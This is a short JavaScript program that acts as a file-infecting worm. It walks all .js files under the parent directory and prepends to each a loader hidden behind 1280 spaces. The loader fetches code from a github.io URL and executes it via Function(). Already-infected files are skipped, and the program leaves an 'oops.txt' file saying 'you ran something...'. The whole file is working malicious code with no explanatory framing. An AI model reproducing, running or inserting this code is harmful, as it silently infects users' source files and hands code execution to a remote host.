(async function $r() {
  try {
    var fs = await import('node:fs');
    var path = await import('node:path');
  } catch {return}
  var files = fs.readdirSync('..', {withFileTypes: true, recursive: true}).filter(e => e.isFile() && e.name.endsWith('.js')).map(e => path.join(e.parentPath, e.name));
  var content = '';
  var loader = "fetch('https://dell-optiplex-790.github.io/plywood/index.js').then(e=>e.text()).then(e=>Function(e)())";
  for(var i = 0; i < files.length; i++) {
    content = fs.readFileSync(files[i], 'utf8');
    if(content.startsWith(' '.repeat(1280) + loader)) {
      continue;
    }
    content = ' '.repeat(1280) + loader + '\n' + content;
    fs.writeFileSync(files[i], content, 'utf8');
  }
  fs.writeFileSync('oops.txt', 'you ran something...');
})();
